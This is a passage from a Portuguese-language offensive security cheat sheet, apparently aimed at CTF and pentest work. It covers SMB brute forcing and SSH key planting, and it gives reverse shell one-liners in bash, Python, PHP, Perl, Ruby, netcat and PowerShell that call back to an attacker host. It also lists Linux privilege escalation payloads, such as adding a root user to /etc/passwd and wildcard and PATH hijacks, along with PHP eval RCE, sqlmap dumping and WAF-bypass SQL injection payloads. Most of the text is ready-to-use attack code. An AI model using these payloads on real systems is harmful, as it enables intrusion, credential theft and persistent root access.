sudo mount -t cifs //ALVO/share /mnt/smb -o username=usuario,password=senha

# Navegar normalmente
ls /mnt/smb/
cat /mnt/smb/credenciais.txt

# Desmontar
sudo umount /mnt/smb
```

### Brute Force de Credenciais
```bash
# Hydra (lento no SMB — usar -t 1)
hydra -l usuario -P /usr/share/wordlists/rockyou.txt smb://ALVO -t 1 -f

# NetExec (mais rápido e moderno)
nxc smb ALVO -u usuario -p /usr/share/wordlists/rockyou.txt
nxc smb ALVO -u usuarios.txt -p senhas.txt --no-bruteforce  # 1:1
nxc smb ALVO -u usuarios.txt -p senha --continue-on-success  # Spray
```

### Verificar Vulnerabilidades (EternalBlue, etc.)
```bash
# Verificar MS17-010 (EternalBlue)
nmap -p 445 --script smb-vuln-ms17-010 ALVO

# Checar todas as vulnerabilidades SMB conhecidas
nmap -p 139,445 --script smb-vuln* ALVO

# Verificar versão do protocolo e configurações
nmap -p 445 --script smb-security-mode ALVO
nmap -p 445 --script smb2-security-mode ALVO
```

### Fluxo de Ataque Completo (exemplo real)
```bash
# 1. Confirmar portas SMB abertas
nmap -p 139,445 ALVO

# 2. Tentar acesso anônimo
smbclient -L //ALVO -N

# 3. Enumerar permissões
smbmap -H ALVO -u "" -p ""

# 4. Se tiver credenciais (ex: extraídas de .env):
nxc smb ALVO -u time -p 'Sup3rM@n.2' --shares

# 5. Conectar no share com READ/WRITE
smbclient //ALVO/home -U time%'Sup3rM@n.2'

# 6. Navegar e extrair arquivos
smb: \> ls
smb: \> cd .ssh
smb: \> get authorized_keys
smb: \> put minha_chave.pub authorized_keys  # Plantar chave SSH!
```

> **Em hacking:** O SMB com permissão de **WRITE** no diretório home do usuário é critical — você pode plantar uma chave SSH pública e conectar via SSH sem senha!

## 🔮 API GraphQL

### Introspection Query (descobrir schema)
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Descobrir queries disponíveis
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

### Exemplo de extração de dados
```graphql
{
  users {
    id
    username
    password
    email
    role
  }
}
```

---

---

# 🐚 Post-Exploitation & Reverse Shells


## 🐚 Reverse Shell Cheatsheet Completo

> **Referência rápida** de reverse shells em múltiplas linguagens. Substituir `SEU_IP` e `PORTA`.

### Bash
```bash
bash -i >& /dev/tcp/SEU_IP/PORTA 0>&1
bash -c 'bash -i >& /dev/tcp/SEU_IP/PORTA 0>&1'
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.74.117",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```

### PHP
```bash
php -r '$sock=fsockopen("SEU_IP",PORTA);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl
```bash
perl -e 'use Socket;$i="SEU_IP";$p=PORTA;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("SEU_IP",PORTA).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat (GNU/OpenBSD)
```bash
# GNU netcat (com -e)
nc -e /bin/sh SEU_IP PORTA

# OpenBSD netcat (sem -e) — via named pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SEU_IP PORTA >/tmp/f
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('SEU_IP',PORTA);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Upgrade para Shell Interativo (após obter reverse shell)
```bash
# 1. Spawnar TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Alternativa sem Python:
script -qc /bin/bash /dev/null

# 2. Ctrl+Z (suspender o netcat)

# 3. No terminal LOCAL:
stty raw -echo; fg

# 4. Dentro da shell remota:
export SHELL=bash
export TERM=xterm-256color
stty rows 40 cols 160
```

### Listener (no atacante)
```bash
# Netcat simples
nc -lvnp PORTA

# Com rlwrap (histórico de comandos + setas)
rlwrap nc -lvnp PORTA

# Pwncat (shell interativo avançado)
pwncat-cs -lp PORTA
```

### 🐚 Penelope — Reverse Shell Handler (Recomendado!)

> **O que é:** Handler avançado de reverse shells em Python. Faz upgrade automático para TTY, suporta múltiplas sessões, download/upload, e logging. **Substitui o netcat como listener.**
> **GitHub:** https://github.com/brightio/penelope

**Instalação:**
```bash
# Clonar o repositório
git clone https://github.com/brightio/penelope.git
cd penelope

# Ou instalar via pip
pip install penelope-shell

# Ou usar direto sem instalar
curl https://raw.githubusercontent.com/brightio/penelope/main/penelope.py -o penelope.py
```

**Iniciar listener (substitui `nc -lvnp`):**
```bash
# Listener básico na porta 4444
python3 penelope.py 4444

# Listener em interface específica
python3 penelope.py 4444 -i 0.0.0.0
```

**Comandos dentro da Penelope (após receber a shell):**

| Comando | Função |
|---|---|
| `Ctrl+C` | **NÃO mata a sessão!** Vai para o menu de sessões |
| `Enter` | Voltar para a sessão ativa |
| `sessions` | Listar todas as sessões (se recebeu múltiplas shells) |
| `use 1` | Trocar para sessão número 1 |
| `download /etc/passwd` | Baixar arquivo do alvo para sua máquina |
| `upload linpeas.sh /tmp/` | Enviar arquivo da sua máquina para o alvo |
| `spawn` | Gerar um novo listener em outra porta |
| `upgrade` | Forçar upgrade da shell para PTY (geralmente automático) |
| `dir` | Mudar o diretório onde os downloads são salvos |
| `kill 1` | Encerrar a sessão número 1 |
| `exit` | Sair da Penelope |

**Gerar payloads de reverse shell automaticamente:**
```bash
# Penelope gera e mostra o payload pronto para copiar
python3 penelope.py 4444 -g

# Gerar payload para sistema específico
python3 penelope.py 4444 -g bash
python3 penelope.py 4444 -g python
python3 penelope.py 4444 -g php
```

**Servir arquivos automaticamente (útil para transferir ferramentas):**
```bash
# Inicia listener E um servidor HTTP na porta 8080 ao mesmo tempo
python3 penelope.py 4444 -s
# No alvo, basta fazer: wget http://SEU_IP:8080/linpeas.sh
```

**Por que usar Penelope em vez de Netcat:**
- ✅ Shell **interativa completa** automaticamente (sem fazer o ritual do `pty.spawn`)
- ✅ **Setas** e **histórico** de comandos nativos
- ✅ **Tab completion** funciona
- ✅ **Ctrl+C** não derruba a sessão (diferente do netcat!)
- ✅ **Múltiplas shells** simultâneas (alterne com `Ctrl+C` → `use N`)
- ✅ **Download/Upload** integrado (sem precisar abrir outro servidor)
- ✅ **Auto-resize** do terminal (sem `stty rows/cols` manual)
- ✅ **Logging** automático de toda a sessão

---

## 🐧 Linux Privilege Escalation & Enumeration

### 👤 Enumeração Básica de Usuários
```bash
# Quem sou eu e meus grupos?
id
whoami
groups

# Quem está logado no sistema?
w
who
last
lastlog

# Listar todos os usuários do sistema
cat /etc/passwd

# Usuários com shell válido
cat /etc/passwd | grep -E -v 'nologin|false'

# Superusuários (UID 0)
awk -F: '($3 == "0") {print}' /etc/passwd

# Histórico de comandos do usuário atual
cat ~/.bash_history
cat ~/.zsh_history

# Procurar arquivos de histórico em outros diretórios (se tiver permissão)
ls -la /home/*/.*history 2>/dev/null
```

### 🔑 Procurando Permissões e Credenciais

```bash
# Permissões sudo do usuário atual
sudo -l

# Procurar binários com SUID bit habilitado (executam como dono do arquivo)
find / -perm -u=s -type f 2>/dev/null

# Procurar binários com GUID bit habilitado (executam como grupo do arquivo)
find / -perm -g=s -type f 2>/dev/null

# Procurar arquivos com permissões abertas (leitura, escrita ou execução para 'outros')
find / -writable -type d -print 2>/dev/null | grep -v "/proc\|/sys\|/run"
find / -perm -2 -type f 2>/dev/null | grep -v "/proc\|/sys\|/run"

# Procurar tarefas Cron (tarefas agendadas)
cat /etc/crontab
ls -la /etc/cron.*
crontab -l 2>/dev/null

# Listar processos rodando como root (procurando serviços vulneráveis)
ps aux | grep root

# Procurar arquivos de credenciais e senhas em claro
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
locate password | more
find / -name "*.cnf" -o -name "*.conf" -o -name "*.ini" -o -name "*.config" 2>/dev/null | xargs grep -i password
```

### 🚀 Técnicas Comuns de Escalabilidade

**1. Sudo e GTFOBins**
Se `sudo -l` listar binários que você pode rodar como root sem senha, procure eles em [GTFOBins](https://gtfobins.github.io/) para obter uma shell root.

`Exemplo com 'vim': sudo vim -c ':!/bin/sh'`
`Exemplo com 'awk': sudo awk 'BEGIN {system("/bin/sh")}'`

**2. SUID e GTFOBins**
O mesmo princípio se aplica a binários com bit SUID. Se encontrar um binário incomum ou com SUID, GTFOBins pode ter a resposta.

`Exemplo com 'find': /usr/bin/find . -exec /bin/sh -p \; -quit`

**3. Cronjobs Vulneráveis**
Se houver um script rodando como root em um cronjob, e você tiver permissão de **escrita** nesse script ou na pasta onde ele se encontra, modifique-o para adicionar um payload (ex: reverse shell em bash) que será executado na próxima rodada do cron.

**4. Senhas Fracas ou Reutilizadas**
Se encontrar senhas no bash history ou em arquivos de config (ex: conexões DB), tente usar essas senhas com o comando `su root` ou para outros usuários via SSH.

**5. Kernel Exploits**
Se tudo falhar, verifique a versão do kernel (`uname -a`) e o SO (`cat /etc/os-release`). Procure exploits conhecidos usando o `searchsploit` ou Google para essa versão específica (ex: Dirty COW, PwnKit).

**6. Linux Capabilities**
Capabilities dão permissões granulares a binários. Se um binário tem `cap_setuid`, pode virar root direto.
```bash
# Encontrar binários com capabilities
getcap -r / 2>/dev/null

# Explorar cap_setuid em python3:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Explorar cap_setuid em perl:
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Explorar cap_dac_override (ignora permissões de arquivos):
# Pode ler/escrever qualquer arquivo, incluindo /etc/shadow
```

**7. Insecure Subprocess / Script Execution**
Scripts Python/Bash de root que executam comandos ou arquivos de forma insegura:
```python
# Exemplo vulnerável (como na máquina Retro.hc):
try:
    subprocess.run(["programa-que-nao-existe", arquivo], check=True)
except FileNotFoundError:
    subprocess.run([arquivo], check=True)  # Executa o arquivo diretamente como root!

# Exploração: criar arquivo executável no path esperado
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /caminho/esperado/payload
chmod +x /caminho/esperado/payload
# Aguardar a execução pelo root (cron, sudo, etc.)
```

---

### 🔓 Payloads Específicos de Privilege Escalation

#### 1. Abuso de Binários com SUID / Sudo Permissivo (GTFOBins)
Se você tem permissão para rodar comandos específicos como root, use estas técnicas de "Escape" da Shell:

**Nmap** (versões antigas do nmap têm um modo interativo)
```bash
nmap --interactive
nmap> !sh
```

**Vim**
```bash
sudo vim -c ':!/bin/sh'
# Ou se o binário tiver bit SUID:
vim -c ':!/bin/sh'
```

**Find**
```bash
sudo find . -exec /bin/sh \; -quit
# SUID:
find . -exec /bin/sh -p \; -quit
```

**Bash / Dash / Sh**
```bash
# Se bash tiver bit SUID
bash -p
```

**Less / More**
```bash
sudo less /etc/shadow
# Aperte 'v' ou digite '!/bin/sh' ou '!/bin/bash' dentro do less e dê Enter
```

**Nano**
```bash
sudo nano /etc/sudoers
# Adicione a seguinte linha:
# seu_usuario ALL=(ALL) NOPASSWD:ALL
# Salve (Ctrl+O, Enter) e saia (Ctrl+X). Então execute:
sudo su
```

#### 2. Exploração de Grupos Sensíveis

**Grupo `docker`**
Qualquer usuário no grupo `docker` pode escalar privilégios para root criando um container que monta a raiz do sistema alvo.
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Grupo `lxd` ou `lxc`**
Permite que o usuário crie um contêiner montando o diretório raiz `/` do host.
```bash
# 1. Necessário construir uma imagem local alpine na própria máquina atacante ou na vítima
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# 2. Dentro do contêiner, o root do sistema hospedeiro estará montado em:
cd /mnt/root
```

**Grupo `disk`**
Permite ler ou gravar diretamente nos discos brutos (ex: `/dev/sda`).
```bash
debugfs /dev/sda1
# Dentro do prompt do debugfs:
debugfs:  cat /etc/shadow
```

#### 3. Exploração de Wildcards em Tarefas (*)

**Wildcard no Tar (`tar czf backup.tar.gz *`)**
Se houver uma cronjob executando tar com wildcard `*` no diretório onde você pode escrever:
```bash
# Cria um script para pegar uma reverse shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SEU_IP 4444 >/tmp/f" > shell.sh
# Cria arquivos com nomes que serão interpretados como parâmetros do 'tar'
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
# Aguarde a cronjob executar e verifique a sua conexão no netcat
```

**Wildcard no Chown / Chmod (`chmod 777 *`)**
```bash
# Cria o payload em /etc/sudoers.d/ para escalar para root
echo "seu_usuario ALL=(root) NOPASSWD: ALL" > /etc/sudoers.d/seu_usuario
# Cria um arquivo com nome de parâmetro que será interpretado pelo chown/chmod
touch -- "--reference=shell.sh"
```

#### 4. PATH Hijacking
Se você identificar um shell script SUID ou rodando como root que chama um binário de sistema (ex: `cat`, `ls`, `ps`) sem usar o caminho absoluto (ex: não usa `/bin/cat`, usa apenas `cat`):
```bash
# 1. Crie o seu payload falso e chame-o de 'cat' no /tmp
echo "/bin/bash -p" > /tmp/cat
chmod +x /tmp/cat

# 2. Insira /tmp no início da variável de ambiente $PATH
export PATH=/tmp:$PATH

# 3. Execute o script vulnerável
./script_vulneravel
```

#### 5. NFS Root Squashing Desabilitado
Se `no_root_squash` estiver ativo para um compartilhamento de rede aberto no arquivo `/etc/exports`:
```bash
# Na sua máquina atacante:
mkdir /tmp/pe
sudo mount -t nfs <IP_ALVO>:<COMPARTILHAMENTO> /tmp/pe
# Copiar o binário bash da máquina atacante para o alvo
sudo cp /bin/bash /tmp/pe/bash
sudo chmod +s /tmp/pe/bash

# Na máquina Vítima alvo:
# Execute o bash que você copiou, que estará com bit SUID como root!
./bash -p
```

---

## ⚡ RCE via PHP `eval()` — Injeção de Código

```bash
# Parâmetro vulnerável injetado via POST ou GET:
calc=system('bash -i >& /dev/tcp/SEU_IP/4444 0>&1');
calc=system('id');
calc=system('cat /etc/passwd');
```

> **O que faz:** A função `eval()` do PHP executa qualquer string como código PHP. Quando o parâmetro de entrada não é sanitizado, é possível chamar `system()` para executar comandos do sistema operacional diretamente.
>
> **Para que serve / quando é útil:** Sempre que uma aplicação processa expressões dinâmicas com `eval()`, `exec()`, `passthru()` ou `shell_exec()` sem validação. Comum em calculadoras web, templates, panels de admin e formulários de busca que aceitam expressões.

---

## 📋 Information Disclosure via `.bash_history`

```bash
# Verificar arquivos ocultos na home de um usuário
ls -la /home/USUARIO/

# Ler o histórico de comandos
cat /home/USUARIO/.bash_history

# Buscar por históricos de todos os usuários (se tiver permissão)
find /home -name ".bash_history" 2>/dev/null | xargs cat
find /root -name ".bash_history" 2>/dev/null | xargs cat
```

> **O que faz:** O arquivo `.bash_history` guarda todos os comandos digitados pelo usuário no terminal. Frequentemente contém senhas digitadas erradas (fora do prompt correto), comandos de conexão com credenciais (ex: `mysql -u root -pSENHA`) ou comandos de manutenção sensíveis.
>
> **Para que serve / quando é útil:** Após conseguir um shell inicial (RCE, LFI, etc.), sempre varra os históricos de todos os usuários do sistema. É um dos vetores mais fáceis de movimentação horizontal e vertical.

---

## 🔄 Pivot de Usuário com `su`

```bash
# Trocar para outro usuário com a senha encontrada
su USUARIO

# Trocar direto para root (se tiver a senha)
su root
su -    # Equivalente com ambiente limpo de root
```

> **O que faz:** `su` (Substitute User) substitui o usuário do shell atual pelo usuário especificado, exigindo a senha correspondente.
>
> **Para que serve / quando é útil:** Após encontrar credenciais (em `.bash_history`, arquivos de config, banco de dados, etc.), use `su` para pivotar para um usuário com mais permissões sem precisar de uma nova conexão.

---

## 🔓 Sudo Script Hijacking (Substituição de Script)

> **Quando é útil:** `sudo -l` mostra que você pode rodar um script específico como root (`NOPASSWD: /usr/bin/python3 /opt/app/script.py`), e o arquivo do script (ou o diretório onde ele está) tem permissão de escrita para o seu usuário.

```bash
# 1. Identificar a regra de sudo
sudo -l
# Exemplo de saída: (ALL) NOPASSWD: /usr/bin/python3 /opt/app/script.py

# 2. Verificar permissões de escrita no arquivo/diretório
ls -la /opt/app/script.py
ls -la /opt/app/

# 3. Fazer backup (boa prática em Red Team)
mv /opt/app/script.py /opt/app/script.py.bak

# 4. Substituir pelo payload malicioso
# Opção A: Criar binário SUID bash (persistência sem senha)
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' > /opt/app/script.py

# Opção B: Reverse Shell direto
echo 'import os; os.system("bash -i >& /dev/tcp/SEU_IP/4444 0>&1")' > /opt/app/script.py

# Opção C: Adicionar usuário root no sistema
echo 'import os; os.system("echo \"hacker:x:0:0:root:/root:/bin/bash\" >> /etc/passwd")' > /opt/app/script.py

# 5. Disparar via Sudo (exatamente como a regra especifica)
sudo /usr/bin/python3 /opt/app/script.py
```

> **O que faz:** Substitui o script legítimo por um malicioso. Como o sudo executa como root, o código malicioso roda com privilégios máximos.
>
> **Sudo Pathing:** O Sudo é literal — se a regra diz `/opt/app/script.py`, o comando deve ser executado com esse caminho exato.

---

## 🐚 Exploração do Binário SUID Bash (`bash -p`)

> Após criar um binário bash com bit SUID (via Script Hijacking ou outro método):

```bash
# Executar o bash SUID preservando os privilégios do dono (root)
/tmp/rootbash -p

# Verificar se escalou
whoami      # deve retornar: root
id          # uid=0(root) gid=...

# Ler flags ou arquivos restritos
cat /root/root.txt
cat /etc/shadow
```

> **O que faz:** A flag `-p` faz o bash não descartar os privilégios do dono do arquivo (EUID). Como o arquivo `/tmp/rootbash` é dono do root e tem bit SUID, ao rodar com `-p` você herda os privilégios de root automaticamente.
>
> **Para que serve / quando é útil:** Sempre que conseguir plantar um bash com SUID (via sudo, cronjob, NFS, etc.). É um método estável de manter acesso root sem precisar de senha.

---

---

# 🛠️ Ferramentas e Comandos de Apoio


## 🛠️ Ferramentas e Comandos de Apoio

### Recon
```bash
subfinder -d ALVO.COM -all -silent | httpx -sc -td
katana -u http://ALVO.COM -d 3 -jc
gau ALVO.COM | kxss
python3 SecretFinder.py -i http://ALVO.COM/app.js -o cli
```

### Fuzzing
```bash
# Diretórios
ffuf -u http://ALVO.COM/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302

# Extensões
wfuzz -c -z file,wordlist.txt -z list,txt-php-html-bak-old --hc 404 http://ALVO.COM/FUZZ.FUZ2Z
```

### SQLMap
```bash
sqlmap -u "http://ALVO.COM/page?id=1" --banner
sqlmap -u "http://ALVO.COM/page?id=1" --dbs
sqlmap -u "http://ALVO.COM/page?id=1" -D BANCO --tables
sqlmap -u "http://ALVO.COM/page?id=1" -D BANCO -T TABELA --columns
sqlmap -u "http://ALVO.COM/page?id=1" -D BANCO -T TABELA -C user,password --dump
```

---

---

# 🛡️ WAF Bypass — Contornando Web Application Firewalls

> **O que é WAF:** Um Web Application Firewall é uma camada de segurança que filtra, monitora e bloqueia requisições HTTP maliciosas antes que elas cheguem à aplicação. WAFs podem ser baseados em **regex** (padrões de texto), **assinatura** (payloads conhecidos), **heurística** (comportamento anômalo) ou **machine learning**.

> **Por que aprender WAF Bypass:** Em ambientes reais e em CTFs avançados, você vai encontrar WAFs como **ModSecurity**, **Cloudflare**, **AWS WAF**, **Akamai**, **Imperva**, **Sucuri**, **Fortinet FortiWeb** entre outros. Saber contorná-los é essencial para pentesting.

---

## 🔎 Detecção de WAF

> Antes de tentar bypass, identifique **se** e **qual** WAF está presente.

### Sinais de que há um WAF
```
- Resposta HTTP 403 Forbidden ao enviar payloads simples como ' OR 1=1 --
- Página de bloqueio customizada ("Request Blocked", "Access Denied", "Forbidden")
- Headers de resposta específicos: X-Sucuri-ID, CF-Ray (Cloudflare), X-CDN (Akamai)
- Status codes incomuns: 406, 419, 429, 503
- Cookie de WAF na resposta (ex: __cfduid, visid_incap_, etc.)
```

### Ferramentas de detecção
```bash
# wafw00f — Identifica WAF automaticamente
pip install wafw00f
wafw00f http://ALVO.COM

# Nmap WAF detection
nmap -p 80,443 --script http-waf-detect ALVO.COM
nmap -p 80,443 --script http-waf-fingerprint ALVO.COM

# Curl manual — Enviar payload e observar resposta
curl -s -o /dev/null -w "%{http_code}" "http://ALVO.COM/?id=' OR 1=1 --"
# Se retornar 403/406/503 → provável WAF

# Verificar headers
curl -I http://ALVO.COM
# Procurar: Server, X-Powered-By, X-CDN, CF-Ray, X-Sucuri-ID, etc.
```

---

## 🧠 Técnicas Genéricas de Bypass (aplicam-se a QUALQUER vetor)

> Essas técnicas servem para SQLi, XSS, LFI, Command Injection — qualquer payload bloqueado por WAF.

### 1. Encoding e Obfuscação

```
# URL Encoding (simples)
' OR 1=1 --   →   %27%20OR%201%3D1%20--

# Double URL Encoding (o servidor decodifica duas vezes)
' OR 1=1 --   →   %2527%2520OR%25201%253D1%2520--

# Triple Encoding (quando há múltiplas camadas de decode)
%25252527

# Unicode / UTF-8 Encoding
' → %C0%A7  ou  %EF%BC%87 (fullwidth apostrophe)
< → %EF%BC%9C
> → %EF%BC%9E
/ → %C0%AF  ou  %E0%80%AF

# HTML Entity Encoding
< → &lt;  ou  &#60;  ou  &#x3C;
> → &gt;  ou  &#62;  ou  &#x3E;
' → &#39;  ou  &#x27;
" → &quot;  ou  &#34;

# Hex Encoding
' → 0x27
admin → 0x61646d696e

# Octal Encoding
/etc/passwd → /\145\164\143/\160\141\163\163\167\144

# Base64 (útil para payloads inteiros)
echo -n "cat /etc/passwd" | base64
# Y2F0IC9ldGMvcGFzc3dk
```

### 2. Manipulação de Espaços em Branco

```
# Substituir espaço por caracteres alternativos
ESPAÇO → %09 (TAB horizontal)
ESPAÇO → %0A (newline / line feed)
ESPAÇO → %0B (TAB vertical)
ESPAÇO → %0C (form feed)
ESPAÇO → %0D (carriage return)
ESPAÇO → %A0 (non-breaking space)
ESPAÇO → %20 (espaço URL-encoded — às vezes o WAF filtra espaço literal mas não %20)
ESPAÇO → /**/ (comentário SQL inline)
ESPAÇO → + (em query strings)

# Exemplos práticos (SQL)
'%09UNION%09SELECT%091,2,3--
'/**/UNION/**/SELECT/**/1,2,3--
'+UNION+SELECT+1,2,3--
```

### 3. Fragmentação e Case Variation

```
# Alternar entre maiúsculas e minúsculas
UNION SELECT  →  uNiOn SeLeCt
SELECT        →  SeLeCt
SCRIPT        →  ScRiPt

# Inserir comentários no meio de palavras-chave (SQL)
UNION → UN/**/ION
SELECT → SEL/**/ECT
UN/**/ION/**/SEL/**/ECT/**/1,2,3--

# Inserir caracteres nulos
UNI%00ON SEL%00ECT
```

### 4. HTTP Parameter Pollution (HPP)

> Enviar o mesmo parâmetro múltiplas vezes. Diferentes servidores/frameworks processam de formas diferentes.

```
# O WAF pode analisar apenas o primeiro valor, mas a aplicação usa o último
?id=1&id=' UNION SELECT 1,2,3--

# Ou vice-versa — o WAF analisa o último, a aplicação usa o primeiro
?id=' UNION SELECT 1,2,3--&id=1

# Dividir o payload entre parâmetros duplicados
# PHP/Apache usa o último; IIS/ASP concatena; JSP usa o primeiro
?id=1 UNION/*&id=*/SELECT/*&id=*/1,2,3--
```

### 5. Alteração de Método HTTP e Content-Type

```bash
# Trocar método HTTP (alguns WAFs só filtram GET)
# Converter GET para POST
curl -X POST http://ALVO.COM/page -d "id=' UNION SELECT 1,2,3--"

# Trocar Content-Type (alguns WAFs só analisam application/x-www-form-urlencoded)
curl -X POST http://ALVO.COM/page \
  -H "Content-Type: application/json" \
  -d '{"id": "'"'"' UNION SELECT 1,2,3--"}'

# Usar multipart/form-data
curl -X POST http://ALVO.COM/page \
  -F "id=' UNION SELECT 1,2,3--"

# Usar charset diferente no Content-Type
Content-Type: application/x-www-form-urlencoded; charset=ibm037
# Encode o payload no charset especificado
```

### 6. Abuso de Headers HTTP

```bash
# Adicionar headers que alguns WAFs usam para whitelist (fingir ser interno)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
True-Client-IP: 127.0.0.1

# Exemplo com curl
curl http://ALVO.COM/?id=1' -H "X-Forwarded-For: 127.0.0.1"
```

### 7. Chunked Transfer Encoding

> Dividir o payload em chunks para evitar que o WAF analise o payload inteiro.

```bash
# Enviar requisição com Transfer-Encoding: chunked
curl -X POST http://ALVO.COM/page \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'4\r\nid=1\r\n7\r\n UNION \r\n8\r\nSELECT \r\n5\r\n1,2,3\r\n0\r\n\r\n'
```

### 8. Request Smuggling (Técnica Avançada)

> Explorar diferenças entre como o WAF/proxy e o backend parseiam o body de uma requisição.

```
# CL.TE (Content-Length vs Transfer-Encoding)
POST / HTTP/1.1
Host: ALVO.COM
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

---

## 💉 WAF Bypass — SQL Injection

> Técnicas específicas para contornar WAFs ao explorar SQLi.

### Bypass de palavras-chave bloqueadas (UNION, SELECT, etc.)

```sql
-- Inline Comments (MySQL versioned comments)
/*!50000UNION*//*!50000SELECT*/1,2,3--
/*!UNION*//*!SELECT*/1,2,3--

-- Comentários dentro de palavras-chave
UN/**/ION/**/SE/**/LECT/**/1,2,3--
UNI%0bON%0bSEL%0bECT%0b1,2,3--

-- Case Variation
uNiOn SeLeCt 1,2,3--
UnION SElEcT 1,2,3--

-- Usar %00 (null byte) dentro de palavras-chave
UNI%00ON SEL%00ECT 1,2,3--

-- Double keywords (se o WAF remove a palavra uma vez)
UNUNIONION SESELECTLECT 1,2,3--
-- Após remoção: UNION SELECT 1,2,3--

-- Usar equivalentes alternativos ao UNION SELECT
-- Subquery em vez de UNION:
' AND 1=0 OR (SELECT password FROM users LIMIT 1)='a
-- UNION ALL em vez de UNION:
' UNION ALL SELECT 1,2,3--
```

### Bypass de aspas (quotes)

```sql
-- Hex encoding em vez de string com aspas
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_name=0x7573657273--
-- 0x7573657273 = 'users'

-- CHAR() function
' UNION SELECT 1, CHAR(117,115,101,114,115), 3--
-- CHAR(117,115,101,114,115) = 'users'

-- CONCAT + CHAR
' UNION SELECT 1, CONCAT(CHAR(117),CHAR(115),CHAR(101),CHAR(114),CHAR(115)), 3--

-- Sem aspas usando variáveis (MySQL)
SET @q = 0x53454C454354202A2046524F4D207573657273; PREPARE stmt FROM @q; EXECUTE stmt;
```

### Bypass de espaço bloqueado

```sql
-- Comentário como espaço
'/**/UNION/**/SELECT/**/1,2,3--

-- TAB (%09)
'%09UNION%09SELECT%091,2,3--

-- Newline (%0A)
'%0AUNION%0ASELECT%0A1,2,3--

-- Carriage Return (%0D)
'%0DUNION%0DSELECT%0D1,2,3--

-- Parênteses (evitam necessidade de espaço)
'UNION(SELECT(1),(2),(3))--

-- Backticks como delimitadores (MySQL)
`UNION`SELECT`1`,`2`,`3`--

-- Plus sign (em query strings)
'+UNION+SELECT+1,2,3--
```

### Bypass de comentários finais (-- e #)

```sql
-- Se -- e # são bloqueados
' UNION SELECT 1,2,3;%00
' UNION SELECT 1,2,'3
' UNION SELECT 1,2,3 OR '1'='1
' UNION SELECT 1,2,3 AND '1'='1

-- Usar comentário de bloco
' UNION SELECT 1,2,3 /* comentário */
```

### Bypass de funções bloqueadas

```sql
-- Se database() é bloqueado
' UNION SELECT 1, schema_name, 3 FROM information_schema.schemata LIMIT 1--
' UNION SELECT 1, (SELECT schema_name FROM information_schema.schemata LIMIT 1), 3--

-- Se version()/@@version é bloqueado
' UNION SELECT 1, @@global.version, 3--
' UNION SELECT 1, version/*!()*/,3--

-- Se SLEEP() é bloqueado (Time-Based Blind)
' AND BENCHMARK(10000000, SHA1('test'))--
' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B)--

-- Se SUBSTRING() é bloqueado
' AND MID(database(),1,1)='a'--
' AND LEFT(database(),1)='a'--
' AND RIGHT(database(),1)='a'--
' AND LPAD(database(),1,0)='a'--

-- Se information_schema é bloqueado (MySQL >= 5.7)
' UNION SELECT 1, table_name, 3 FROM mysql.innodb_table_stats--

-- Se extractvalue é bloqueado
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e), 1)--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,database(),0x7e)) USING utf8)))--
```

### Bypass com Stack Queries e Prepared Statements

```sql
-- Prepared statements (MySQL)
';SET @s=0x53454C454354202A2046524F4D207573657273;PREPARE stmt FROM @s;EXECUTE stmt;--

-- Hex-encoded query completa
';SET @q=0x73656C65637420404076657273696F6E;PREPARE stmt FROM @q;EXECUTE stmt;--
-- 0x73656C65637420404076657273696F6E = 'select @@version'
```

### WAF Bypass — PostgreSQL Específico

```sql
-- Usar $$ como delimitador de string (evita aspas)
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_name=$$users$$--

-- CHR() em vez de CHAR()
' UNION SELECT NULL, CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115), NULL--

